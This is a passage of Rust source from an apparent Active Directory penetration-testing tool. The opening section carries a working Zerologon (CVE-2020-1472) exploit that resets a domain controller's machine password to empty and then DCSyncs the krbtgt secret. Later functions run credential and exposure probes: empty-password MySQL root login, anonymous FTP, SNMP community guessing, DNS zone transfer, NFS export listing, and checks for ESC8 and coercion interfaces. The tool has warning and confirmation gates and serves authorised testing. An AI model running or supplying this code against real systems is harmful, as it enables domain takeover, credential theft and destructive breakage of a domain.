        "{} — Netlogon zero-auth probe (≤{} attempts)",
        a.host, a.attempts
    ));
    let vuln = match detect_zerologon(&a.host, &a.netbios, a.attempts).await? {
        Zerologon::Vulnerable { attempts } => {
            sp.done("probe complete");
            ui::bad(&format!(
                "VULNERABLE to Zerologon (CVE-2020-1472) — Netlogon accepted an unauthenticated \
                 all-zero secure channel after {attempts} attempt(s)"
            ));
            ui::field(
                "impact",
                "an unauthenticated attacker can set the DC machine account password to empty → \
                 DCSync the domain → Domain Admin.",
            );
            ui::field(
                "remediation",
                "apply the August 2020 patch + enforce KB4557222.",
            );
            true
        }
        Zerologon::NotVulnerable { attempts } => {
            sp.done("probe complete");
            ui::ok(&format!(
                "not vulnerable to Zerologon — all {attempts} attempts rejected (patched/enforced)"
            ));
            false
        }
    };

    if !a.exploit || !vuln {
        if vuln {
            ui::info("safe detection only — machine password untouched. Re-run with --exploit to prove impact.");
        }
        return Ok(());
    }

    // --- Exploitation (DESTRUCTIVE) — double-gated ---
    ui::bad("EXPLOIT resets the DC machine account password to EMPTY. This is DESTRUCTIVE.");
    ui::warn("It orphans the DC's secure channel and can PERMANENTLY BREAK a single-DC domain —");
    ui::warn("restore requires the ORIGINAL machine secret and is NOT guaranteed on a lone DC.");
    ui::warn(
        "Only run against an authorized, RECOVERABLE target (multi-DC domain, or disposable).",
    );
    if !a.confirm_brick_risk {
        ui::info(
            "refusing to exploit: re-run with --confirm-brick-risk once you accept the above.",
        );
        return Ok(());
    }
    if !a.yes {
        use std::io::Write;
        print!("Proceed with exploitation? [y/N]: ");
        std::io::stdout().flush().ok();
        let mut line = String::new();
        std::io::stdin().read_line(&mut line).ok();
        if !line.trim().eq_ignore_ascii_case("y") {
            ui::info("declined — machine password untouched.");
            return Ok(());
        }
    }

    let sp = ui::Spinner::start("resetting machine password to empty (Netlogon)");
    let ok = exploit_set_empty_password(&a.host, &a.netbios, a.attempts).await?;
    if !ok {
        sp.done("reset not accepted");
        ui::warn(
            "NetrServerPasswordSet2 was rejected — the DC may be patched between probe and reset.",
        );
        return Ok(());
    }
    sp.done("machine password reset to EMPTY");
    let empty_hash = "31d6cfe0d16ae931b73c59d7e0c089c0";
    ui::field(
        "account",
        &format!("{}$  NT hash now = {empty_hash} (empty)", a.netbios),
    );

    // Prove Domain Admin: DCSync the whole domain authenticating as the DC machine account.
    let domain = if a.domain.is_empty() {
        &a.netbios
    } else {
        &a.domain
    };
    ui::info("DCSync as the DC machine account (empty hash) — proving Domain Admin:");
    let exe = std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe: {e}"))?;
    // The machine password is now empty, so authenticate as DC$ with an empty password.
    let out = std::process::Command::new(&exe)
        .args([
            "attack",
            "dcsync",
            "--host",
            &a.host,
            "--domain",
            domain,
            "--user",
            &format!("{}$", a.netbios),
            "--password",
            "",
            "--target",
            "krbtgt",
        ])
        .output()
        .map_err(|e| anyhow::anyhow!("spawn dcsync: {e}"))?;
    let dump = String::from_utf8_lossy(&out.stdout);
    let mut dumped = false;
    for line in dump
        .lines()
        .filter(|l| l.contains(":::") || l.contains("aes256"))
    {
        println!("    {line}");
        dumped = true;
    }
    if dumped {
        ui::bad("Domain Admin proven — krbtgt secret replicated as the DC machine account (empty password).");
    } else {
        ui::warn("reset succeeded but DCSync-as-DC$ returned nothing (retry `attack dcsync --user <DC>$ --password \"\"`).");
    }

    ui::warn("machine password is left EMPTY — RESTORE it now to avoid orphaning the DC:");
    ui::field(
        "restore",
        &format!(
            "recover the ORIGINAL {}$ secret from the DC's LSA (secretsdump with a DCSync'd admin \
             hash → $MACHINE.ACC) and set it back via NetrServerPasswordSet over a legitimate \
             Netlogon channel. (Automated restore is the next build step.)",
            a.netbios
        ),
    );
    Ok(())
}

/// DC posture over MS-RRP + pipe reachability: LDAP signing / channel binding (`NTDS\Parameters`)
/// and the Print Spooler — the NTLM-relay and coercion enablers a passive LDAP scan can't see.
async fn posture_scan(a: PostureArgs) -> Result<()> {
    use crate::host_posture::{ldap_channel_binding, ldap_signing, spooler_running};
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let sp = ui::Spinner::start(format!("{} — SMB auth + \\winreg", a.host));
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    // Read the NTDS relay-posture values, scoped so the RRP client releases the SMB session.
    let ntds = "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters";
    let (signing, cbt) = {
        let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
            .await
            .map_err(|e| {
                // 0xC00000AC = STATUS_ILLEGAL_FUNCTION → \winreg pipe not exposed, i.e. the
                // Remote Registry service is stopped/disabled. Very common on hardened DCs
                // and on fresh Server 2022/2025 installs.
                let msg = e.to_string();
                if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                    anyhow::anyhow!(
                        "\\winreg unreachable on {} — the Remote Registry service is stopped or \
                         disabled (STATUS_ILLEGAL_FUNCTION 0xC00000AC). Start it on the DC \
                         (`Set-Service RemoteRegistry -StartupType Automatic; Start-Service RemoteRegistry`) \
                         then rerun. Spooler-only posture still runs without it — but the LDAP \
                         signing / channel binding values require registry read.",
                        a.host
                    )
                } else {
                    e.into()
                }
            })?;
        let s = reg
            .read_value(ntds, "LDAPServerIntegrity")
            .await
            .ok()
            .and_then(|v| v.as_dword());
        let c = reg
            .read_value(ntds, "LdapEnforceChannelBinding")
            .await
            .ok()
            .and_then(|v| v.as_dword());
        (s, c)
    };
    // Spooler running? The \spoolss pipe answering means the service is up.
    let spooler_open = smb.open_pipe("spoolss").await.is_ok();
    sp.done("posture read");

    ui::header(&format!("DC posture — {}", a.host));
    let mut hits = Vec::new();
    hits.extend(ldap_signing(signing));
    hits.extend(ldap_channel_binding(cbt));
    hits.extend(spooler_running(spooler_open));

    if hits.is_empty() {
        ui::ok("LDAP signing + channel binding enforced, no Spooler on the DC — no relay/coercion posture exposure");
    } else {
        for h in &hits {
            ui::warn(&format!("[{}] {} — {}", h.severity, h.id, h.title));
            ui::field("detail", &h.detail);
        }
        ui::warn(&format!(
            "{} relay/coercion posture exposure(s) on {}",
            hits.len(),
            a.host
        ));
    }
    Ok(())
}

/// True if an HTTP reply to `/certsrv` is an NTLM/Negotiate 401 over cleartext HTTP — the
/// relayable ESC8 web-enrollment surface (no TLS ⇒ no channel binding to stop the relay).
fn is_esc8_response(resp: &str) -> bool {
    let head = resp.split("\r\n\r\n").next().unwrap_or(resp);
    let low = head.to_ascii_lowercase();
    head.contains(" 401")
        && low.contains("www-authenticate")
        && (low.contains("negotiate") || low.contains("ntlm"))
}

/// ESC8 detection: probe a CA host's web-enrollment endpoint over HTTP/80. A cleartext NTLM 401
/// means the CA is relay-enrollable (coerce a machine → relay its NTLM to `/certsrv` → machine
/// cert → PKINIT → its TGT). Returns the finding text, or None if not exposed on HTTP.
async fn esc8_probe(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 80).await?;
    let req =
        format!("GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
    s.write_all(req.as_bytes()).await.ok()?;
    let mut buf = [0u8; 2048];
    let n = read_some(&mut s, &mut buf).await;
    is_esc8_response(&String::from_utf8_lossy(&buf[..n])).then(|| {
        format!(
            "ESC8: web enrollment at http://{host}/certsrv exposes NTLM over cleartext (relayable)"
        )
    })
}

/// Enumerate enterprise CAs and actively check each for ESC8 web-enrollment exposure. ESC8 is
/// relay-only, so it can't be decided from the passive LDAP snapshot — this probes the CA host.
async fn adcsenum(a: DnsArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let sp = ui::Spinner::start("enumerating enterprise CAs");
    let mut c = Collector::connect(&cfg).await?;
    let cas = c.read_cas().await?;
    sp.done(&format!("{} enterprise CA(s) found", cas.len()));
    if cas.is_empty() {
        ui::warn("no enterprise CA found in the forest");
        return Ok(());
    }
    ui::header("AD CS — Certification Authorities");
    let mut esc8 = 0usize;
    for (name, host) in &cas {
        ui::field(
            &format!("CA {name}"),
            &format!("host {}", if host.is_empty() { "?" } else { host }),
        );
        if host.is_empty() {
            continue;
        }
        let sp = ui::Spinner::start(format!("probing {host} web enrollment (ESC8)"));
        let hit = esc8_probe(host).await;
        match hit {
            Some(d) => {
                esc8 += 1;
                sp.done_warn(&d);
            }
            None => sp.done(&format!(
                "{host}: ESC8 web enrollment not exposed over http/80"
            )),
        }
    }
    if esc8 > 0 {
        ui::warn(&format!(
            "AD CS: {esc8} ESC8 web-enrollment exposure(s) across {} CA(s)",
            cas.len()
        ));
    } else {
        ui::ok(&format!(
            "AD CS: {} CA(s), no ESC8 web-enrollment exposure",
            cas.len()
        ));
    }
    ui::info("ESC11 (unencrypted ICPR) detection: follow-up — needs a CA config read");
    Ok(())
}

async fn ftp_anon(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 21).await?;
    let mut buf = [0u8; 512];
    read_some(&mut s, &mut buf).await; // 220 banner
    s.write_all(b"USER anonymous\r\n").await.ok()?;
    read_some(&mut s, &mut buf).await;
    s.write_all(b"PASS anonymous@adhammer\r\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    String::from_utf8_lossy(&buf[..n])
        .starts_with("230")
        .then(|| "FTP: ANONYMOUS LOGIN ALLOWED".to_string())
}

async fn smtp_vrfy(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 25).await?;
    let mut buf = [0u8; 512];
    read_some(&mut s, &mut buf).await;
    s.write_all(b"VRFY root\r\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    let r = String::from_utf8_lossy(&buf[..n]);
    (r.starts_with("250") || r.starts_with("252"))
        .then(|| "SMTP: VRFY enabled (user enumeration)".to_string())
}

async fn redis_unauth(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 6379).await?;
    s.write_all(b"INFO\r\n").await.ok()?;
    let mut buf = [0u8; 512];
    let n = read_some(&mut s, &mut buf).await;
    String::from_utf8_lossy(&buf[..n])
        .contains("redis_version")
        .then(|| "REDIS: UNAUTHENTICATED (no AUTH required)".to_string())
}

/// EPM (135): report which attack-relevant RPC interfaces are registered on the endpoint mapper.
async fn rpc_surface(host: &str) -> Option<String> {
    use dcerpc::{epm, Syntax};
    let ifaces = [
        (
            "e3514235-4b06-11d1-ab04-00c04fc2dcd2",
            4u16,
            0u16,
            "DRSUAPI(dcsync)",
        ),
        ("367abb81-9844-35f1-ad32-98f038001003", 2, 0, "SVCCTL(exec)"),
        ("86d35949-83c9-4044-b424-db363231fd0c", 1, 0, "TSCH(exec)"),
        (
            "338cd001-2244-31f1-aaaa-900038001003",
            1,
            0,
            "RemoteRegistry",
        ),
        (
            "c681d488-d850-11d0-8c52-00c04fd90f7e",
            1,
            0,
            "EFSR(petitpotam)",
        ),
        (
            "12345678-1234-abcd-ef00-0123456789ab",
            1,
            0,
            "RPRN(printerbug)",
        ),
    ];
    let mut found = Vec::new();
    for (uuid, maj, min, name) in ifaces {
        if epm::resolve_port(host, Syntax::new(uuid, maj, min))
            .await
            .is_ok()
        {
            found.push(name);
        }
    }
    (!found.is_empty()).then(|| format!("RPC/EPM registered: {}", found.join(", ")))
}

/// VNC (5900): RFB handshake — flag if security-type None (no auth) is offered.
async fn vnc_noauth(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 5900).await?;
    let mut ver = [0u8; 12];
    tokio::time::timeout(
        std::time::Duration::from_millis(900),
        s.read_exact(&mut ver),
    )
    .await
    .ok()?
    .ok()?;
    if &ver[0..3] != b"RFB" {
        return None;
    }
    s.write_all(&ver).await.ok()?; // accept the server's protocol version
    let mut buf = [0u8; 64];
    let n = read_some(&mut s, &mut buf).await;
    let v = String::from_utf8_lossy(&ver).trim().to_string();
    if n >= 2 {
        let count = buf[0] as usize;
        if buf[1..(1 + count).min(n)].contains(&1) {
            return Some(format!("VNC ({v}): NO AUTH (security-type None offered)"));
        }
        return Some(format!("VNC ({v}): auth required"));
    }
    None
}

/// WinRM (5985/5986): probe /wsman and report the offered HTTP auth methods.
async fn winrm_probe(host: &str, port: u16) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, port).await?;
    let req = format!("POST /wsman HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/soap+xml;charset=UTF-8\r\nContent-Length: 0\r\n\r\n");
    s.write_all(req.as_bytes()).await.ok()?;
    let mut buf = [0u8; 1024];
    let n = read_some(&mut s, &mut buf).await;
    let r = String::from_utf8_lossy(&buf[..n]);
    if r.contains(" 401") {
        let mut m = Vec::new();
        for a in ["Negotiate", "NTLM", "Kerberos", "Basic"] {
            if r.contains(a) {
                m.push(a);
            }
        }
        Some(format!(
            "WinRM: enabled (auth: {})",
            if m.is_empty() {
                "unknown".into()
            } else {
                m.join("/")
            }
        ))
    } else {
        r.contains("HTTP/1.")
            .then(|| "WinRM: HTTP responding".to_string())
    }
}

/// Rsync (873): speak the rsyncd greeting and list modules — a blank module name asks the
/// daemon to enumerate everything it exports (classic anonymous-rsync exposure).
async fn rsync_modules(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 873).await?;
    let mut buf = [0u8; 1024];
    let n = read_some(&mut s, &mut buf).await; // "@RSYNCD: <ver>\n"
    let greet = String::from_utf8_lossy(&buf[..n]);
    let ver = greet.strip_prefix("@RSYNCD:").map(|v| v.trim())?;
    // Echo the version back, then send an empty module name to request the module list.
    s.write_all(format!("@RSYNCD: {ver}\n").as_bytes())
        .await
        .ok()?;
    s.write_all(b"\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    let body = String::from_utf8_lossy(&buf[..n]);
    let mods: Vec<&str> = body
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("@RSYNCD"))
        .map(|l| l.split_whitespace().next().unwrap_or(l))
        .collect();
    if mods.is_empty() {
        Some("RSYNC: daemon reachable (no anonymous modules listed)".to_string())
    } else {
        Some(format!(
            "RSYNC: {} module(s) exported: {}",
            mods.len(),
            mods.join(", ")
        ))
    }
}

/// MySQL (3306): parse the initial handshake for the server version, then test an
/// empty-password `root` login — a real credential finding, consistent with the other
/// deep checks (FTP anon / Redis unauth).
async fn mysql_probe(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 3306).await?;
    // --- read the server's initial HandshakeV10 packet ---
    let mut hdr = [0u8; 4];
    tokio::time::timeout(
        std::time::Duration::from_millis(1000),
        s.read_exact(&mut hdr),
    )
    .await
    .ok()?
    .ok()?;
    let plen = (hdr[0] as usize) | (hdr[1] as usize) << 8 | (hdr[2] as usize) << 16;
    if !(1..=1024).contains(&plen) {
        return None;
    }
    let mut pkt = vec![0u8; plen];
    s.read_exact(&mut pkt).await.ok()?;
    if pkt.first() != Some(&10) {
        // Not protocol 10 — could be an ERR (e.g. host not allowed). Report what we can.
        if pkt.first() == Some(&0xff) {
            return Some("MySQL: reachable, host-not-allowed / access denied".to_string());
        }
        return Some("MySQL: reachable (unrecognized handshake)".to_string());
    }
    let ver_end = pkt[1..].iter().position(|&b| b == 0).map(|p| p + 1)?;
    let version = String::from_utf8_lossy(&pkt[1..ver_end]).to_string();

    // --- HandshakeResponse41: user root, empty auth, native-password plugin ---
    let mut body = Vec::new();
    body.extend_from_slice(&0x0008_8201u32.to_le_bytes()); // LONG_PASSWORD|PROTOCOL_41|SECURE_CONNECTION|PLUGIN_AUTH
    body.extend_from_slice(&0x0100_0000u32.to_le_bytes()); // max packet 16M
    body.push(0x21); // charset utf8
    body.extend_from_slice(&[0u8; 23]); // reserved
    body.extend_from_slice(b"root\0");
    body.push(0x00); // auth-response length = 0 (empty password)
    body.extend_from_slice(b"mysql_native_password\0");
    let mut resp = vec![
        body.len() as u8,
        (body.len() >> 8) as u8,
        (body.len() >> 16) as u8,
        1,
    ];
    resp.extend_from_slice(&body);
    s.write_all(&resp).await.ok()?;

    // --- read the auth result ---
    let mut rh = [0u8; 4];
    if s.read_exact(&mut rh).await.is_err() {
        return Some(format!(
            "MySQL {version}: handshake parsed (login result unavailable)"
        ));
    }
    let rlen = (rh[0] as usize) | (rh[1] as usize) << 8 | (rh[2] as usize) << 16;
    let mut rp = vec![0u8; rlen.min(1024)];
    let _ = s.read_exact(&mut rp).await;
    match rp.first() {
        Some(0x00) => Some(format!("MySQL {version}: EMPTY root PASSWORD ACCEPTED")),
        Some(0x01) if rp.get(1) == Some(&0x03) => Some(format!(
            "MySQL {version}: EMPTY root PASSWORD ACCEPTED (caching_sha2 fast-auth)"
        )),
        _ => Some(format!(
            "MySQL {version}: auth required (root/empty rejected)"
        )),
    }
}

/// MSSQL (1433): TDS PRELOGIN handshake — reports the SQL Server version and whether transport
/// encryption is enforced (ENCRYPT_OFF/NOT_SUP = credentials cross the wire in cleartext).
async fn mssql_prelogin(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 1433).await?;
    // PRELOGIN options: VERSION(0x00,6) ENCRYPTION(0x01,1) TERMINATOR(0xff), then the data.
    let mut opts = Vec::new();
    let data_start = 3 * 2 + 1; // two 5-byte option entries + 1 terminator
    opts.extend_from_slice(&[0x00, 0x00, data_start as u8, 0x00, 0x06]); // VERSION @ +0, len 6
    opts.extend_from_slice(&[0x01, 0x00, (data_start + 6) as u8, 0x00, 0x01]); // ENCRYPTION, len 1
    opts.push(0xff); // terminator
    opts.extend_from_slice(&[0u8; 6]); // VERSION data
    opts.push(0x00); // ENCRYPT_OFF
    let total = 8 + opts.len();
    let mut pkt = vec![0x12, 0x01, (total >> 8) as u8, total as u8, 0, 0, 0, 0]; // TDS header (type PRELOGIN, EOM)
    pkt.extend_from_slice(&opts);
    s.write_all(&pkt).await.ok()?;

    let mut hdr = [0u8; 8];
    tokio::time::timeout(
        std::time::Duration::from_millis(1000),
        s.read_exact(&mut hdr),
    )
    .await
    .ok()?
    .ok()?;
    if hdr[0] != 0x04 {
        return Some("MSSQL: reachable (unexpected TDS response)".to_string());
    }
    let len = ((hdr[2] as usize) << 8 | hdr[3] as usize).saturating_sub(8);
    let mut body = vec![0u8; len.min(512)];
    if s.read_exact(&mut body).await.is_err() || body.len() < 5 {
        return Some("MSSQL: TDS PRELOGIN responded".to_string());
    }
    let (version, enc) = parse_prelogin(&body);
    let v = version.unwrap_or_else(|| "unknown".into());
    let e = match enc {
        Some(0x00) => "encryption OFF (login in cleartext)",
        Some(0x02) => "encryption NOT SUPPORTED (login in cleartext)",
        Some(0x01) => "encryption available",
        Some(0x03) => "encryption REQUIRED",
        _ => "encryption state unknown",
    };
    Some(format!("MSSQL {v}: {e}"))
}

/// Walk a TDS PRELOGIN option table for VERSION(0x00) → "maj.min.build" and ENCRYPTION(0x01).
fn parse_prelogin(body: &[u8]) -> (Option<String>, Option<u8>) {
    let (mut version, mut enc) = (None, None);
    let mut i = 0;
    while i + 5 <= body.len() && body[i] != 0xff {
        let token = body[i];
        let off = (body[i + 1] as usize) << 8 | body[i + 2] as usize;
        let l = (body[i + 3] as usize) << 8 | body[i + 4] as usize;
        if off + l <= body.len() {
            let d = &body[off..off + l];
            if token == 0x00 && l >= 4 {
                version = Some(format!(
                    "{}.{}.{}",
                    d[0],
                    d[1],
                    (d[2] as u16) << 8 | d[3] as u16
                ));
            } else if token == 0x01 && l >= 1 {
                enc = Some(d[0]);
            }
        }
        i += 5;
    }
    (version, enc)
}

/// DNS (53): fingerprint via `version.bind` (CHAOS TXT) and, if a zone is supplied, attempt an
/// AXFR zone transfer over TCP and report how many records the server leaked.
async fn dns_check(host: &str, zone: Option<&str>) -> Option<String> {
    let mut out = Vec::new();
    if let Some(v) = dns_version_bind(host).await {
        out.push(format!("version.bind={v}"));
    }
    if let Some(z) = zone {
        match dns_axfr(host, z).await {
            Some(count) if count > 0 => {
                out.push(format!("AXFR OK for {z}: {count} records LEAKED"))
            }
            Some(_) => out.push(format!("AXFR refused for {z}")),
            None => {}
        }
    }
    (!out.is_empty()).then(|| format!("DNS: {}", out.join(" · ")))
}

/// CHAOS-class TXT query for `version.bind` over UDP — reveals the resolver software/version.
async fn dns_version_bind(host: &str) -> Option<String> {
    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
    sock.connect((host, 53)).await.ok()?;
    // Header: id, flags(RD), qd=1; Question: version.bind TXT CH.
    let mut q = vec![0x13, 0x37, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
    for label in ["version", "bind"] {
        q.push(label.len() as u8);
        q.extend_from_slice(label.as_bytes());
    }
    q.push(0);
    q.extend_from_slice(&[0x00, 0x10, 0x00, 0x03]); // TXT, CHAOS
    sock.send(&q).await.ok()?;
    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
        .await
        .ok()?
        .ok()?;
    // Grab the longest printable run in the answer section as the version string.
    let ans = &buf[..n];
    let mut best = String::new();
    let mut cur = String::new();
    for &b in &ans[12.min(n)..] {
        if (0x20..0x7f).contains(&b) {
            cur.push(b as char);
        } else {
            if cur.trim().len() > best.trim().len() {
                best = cur.clone();
            }
            cur.clear();
        }
    }
    if cur.trim().len() > best.trim().len() {
        best = cur;
    }
    let best = best.trim().to_string();
    (best.len() >= 3).then_some(best)
}

/// Attempt a full AXFR zone transfer over TCP/53. Returns the number of resource records
/// returned (0 = server refused / not authoritative), or None if the query failed.
async fn dns_axfr(host: &str, zone: &str) -> Option<usize> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 53).await?;
    let mut msg = vec![0x13, 0x38, 0x00, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]; // no RD; AXFR is authoritative
    for label in zone.split('.').filter(|l| !l.is_empty()) {
        msg.push(label.len() as u8);
        msg.extend_from_slice(label.as_bytes());
    }
    msg.push(0);
    msg.extend_from_slice(&[0x00, 0xfc, 0x00, 0x01]); // QTYPE=AXFR(252), QCLASS=IN
    let framed = [&(msg.len() as u16).to_be_bytes()[..], &msg].concat(); // TCP DNS 2-byte length prefix
    s.write_all(&framed).await.ok()?;
    // Read length-prefixed response messages until the connection closes or a short read.
    let mut total_ancount = 0usize;
    let mut got_any = false;
    loop {
        let mut len = [0u8; 2];
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            s.read_exact(&mut len),
        )
        .await
        {
            Ok(Ok(_)) => {}
            _ => break,
        }
        let n = u16::from_be_bytes(len) as usize;
        if n < 12 {
            break;
        }
        let mut buf = vec![0u8; n];
        if s.read_exact(&mut buf).await.is_err() {
            break;
        }
        got_any = true;
        let rcode = buf[3] & 0x0f;
        if rcode != 0 {
            return Some(0); // REFUSED / NOTAUTH etc.
        }
        total_ancount += u16::from_be_bytes([buf[6], buf[7]]) as usize;
        // AXFR ends when the closing SOA is returned; a single message with ANCOUNT is enough
        // to conclude for our purposes, but keep reading in case it is chunked.
        if total_ancount > 1 {
            break;
        }
    }
    got_any.then_some(total_ancount)
}

/// NFS (via portmap/111): GETPORT for the MOUNT program, then MOUNTPROC_EXPORT to list the
/// exported shares — the `showmount -e` equivalent, a classic data-exposure finding.
async fn nfs_showmount(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    // --- portmap GETPORT (prog 100000 v2 proc 3) for MOUNT (100005) v3 over TCP(6) ---
    let mut s = connect(host, 111).await?;
    let mut call = rpc_call(100000, 2, 3, 0x4841_4d31);
    call.extend_from_slice(&100005u32.to_be_bytes()); // prog
    call.extend_from_slice(&3u32.to_be_bytes()); // vers
    call.extend_from_slice(&6u32.to_be_bytes()); // proto = TCP
    call.extend_from_slice(&0u32.to_be_bytes()); // port (ignored)
    s.write_all(&rpc_frame(&call)).await.ok()?;
    let reply = rpc_recv(&mut s).await?;
    let port = reply
        .get(reply.len().saturating_sub(4)..)
        .map(|b| u32::from_be_bytes(b.try_into().unwrap()))?;
    if port == 0 || port > 65535 {
        return Some("NFS: portmap up but MOUNT not registered".to_string());
    }
    // --- MOUNT EXPORT (prog 100005 v3 proc 5) on the resolved port ---
    let mut m = connect(host, port as u16).await?;
    let call = rpc_call(100005, 3, 5, 0x4841_4d32);
    m.write_all(&rpc_frame(&call)).await.ok()?;
    let mut buf = vec![0u8; 4096];
    let n = tokio::time::timeout(std::time::Duration::from_millis(1200), m.read(&mut buf))
        .await
        .ok()?
        .ok()?;
    // The export list is a chain of (opaque dirpath, group list, next?) — pull the dirpath strings.
    let exports = parse_exports(&buf[..n.min(buf.len())]);
    if exports.is_empty() {
        Some(format!(
            "NFS: MOUNT on :{port} (no exports listed / access denied)"
        ))
    } else {
        Some(format!(
            "NFS: {} export(s): {}",
            exports.len(),
            exports.join(", ")
        ))
    }
}

/// Build an ONC RPC v2 CALL header with AUTH_NULL creds/verifier for the given program.
fn rpc_call(prog: u32, vers: u32, proc_: u32, xid: u32) -> Vec<u8> {
    let mut b = Vec::new();
    b.extend_from_slice(&xid.to_be_bytes());
    b.extend_from_slice(&0u32.to_be_bytes()); // msg_type = CALL
    b.extend_from_slice(&2u32.to_be_bytes()); // rpcvers
    b.extend_from_slice(&prog.to_be_bytes());
    b.extend_from_slice(&vers.to_be_bytes());
    b.extend_from_slice(&proc_.to_be_bytes());
    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // cred: AUTH_NULL, len 0
    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // verf: AUTH_NULL, len 0
    b
}

/// Wrap an RPC message in a single last-fragment record marker (TCP transport).
fn rpc_frame(msg: &[u8]) -> Vec<u8> {
    let marker = 0x8000_0000u32 | (msg.len() as u32);
    [&marker.to_be_bytes()[..], msg].concat()
}

/// Read one record-marked RPC reply and return the payload after the 24-byte accepted-reply head.
async fn rpc_recv(s: &mut tokio::net::TcpStream) -> Option<Vec<u8>> {
    use tokio::io::AsyncReadExt;
    let mut m = [0u8; 4];
    tokio::time::timeout(std::time::Duration::from_millis(1200), s.read_exact(&mut m))
        .await
        .ok()?
        .ok()?;
    let len = (u32::from_be_bytes(m) & 0x7fff_ffff) as usize;
    if !(4..=65536).contains(&len) {
        return None;
    }
    let mut buf = vec![0u8; len];
    s.read_exact(&mut buf).await.ok()?;
    Some(buf)
}

/// Parse a MOUNTPROC_EXPORT reply body into export path strings (best-effort XDR walk).
fn parse_exports(body: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 24usize.min(body.len()); // skip RPC accepted-reply header
    while i + 4 <= body.len() {
        let more = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
        i += 4;
        if more != 1 {
            break; // 0 = end of export list
        }
        if i + 4 > body.len() {
            break;
        }
        let dlen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
        i += 4;
        if dlen == 0 || dlen > 1024 || i + dlen > body.len() {
            break;
        }
        out.push(String::from_utf8_lossy(&body[i..i + dlen]).to_string());
        i += (dlen + 3) & !3; // XDR 4-byte alignment
                              // Skip the group list attached to this export.
        while i + 4 <= body.len() {
            let g = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
            i += 4;
            if g != 1 {
                break;
            }
            if i + 4 > body.len() {
                break;
            }
            let glen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
            i += 4 + ((glen + 3) & !3);
        }
    }
    out
}

/// SNMP (UDP/161): GET sysDescr.0 with each community string; a valid reply means the community
/// is accepted (read access to the whole MIB) — reports the community and the system descriptor.
async fn snmp_public(host: &str, communities: &str) -> Option<String> {
    for community in communities
        .split(',')
        .map(str::trim)
        .filter(|c| !c.is_empty())
    {
        if let Some(desc) = snmp_get_sysdescr(host, community).await {
            let d = desc.chars().take(60).collect::<String>();
            return Some(format!("SNMP: community '{community}' VALID → {d}"));
        }
    }
    None
}

/// One SNMPv1 GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0); returns the descriptor if accepted.
async fn snmp_get_sysdescr(host: &str, community: &str) -> Option<String> {
    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
    sock.connect((host, 161)).await.ok()?;
    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]; // 1.3.6.1.2.1.1.1.0
    let varbind = ber_seq(&[ber(0x06, &oid), ber(0x05, &[])].concat()); // OID + NULL
    let varbinds = ber_seq(&varbind);
    let pdu_body = [
        ber(0x02, &[0x2a]), // request-id
        ber(0x02, &[0x00]), // error-status
        ber(0x02, &[0x00]), // error-index
        varbinds,
    ]
    .concat();
    let pdu = ber(0xa0, &pdu_body); // GetRequest
    let msg = ber_seq(
        &[
            ber(0x02, &[0x00]),              // version = 0 (v1)
            ber(0x04, community.as_bytes()), // community
            pdu,
        ]
        .concat(),
    );
    sock.send(&msg).await.ok()?;
    let mut buf = [0u8; 1500];
    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
        .await
        .ok()?
        .ok()?;
    // Any well-formed SEQUENCE reply means the community was accepted; pull the sysDescr string.
    let resp = &buf[..n];
    if resp.first() != Some(&0x30) {
        return None;
    }
    Some(snmp_first_octet_string(resp).unwrap_or_else(|| "(accepted)".to_string()))
}

/// Minimal BER: definite-length TLV (lengths < 65536).
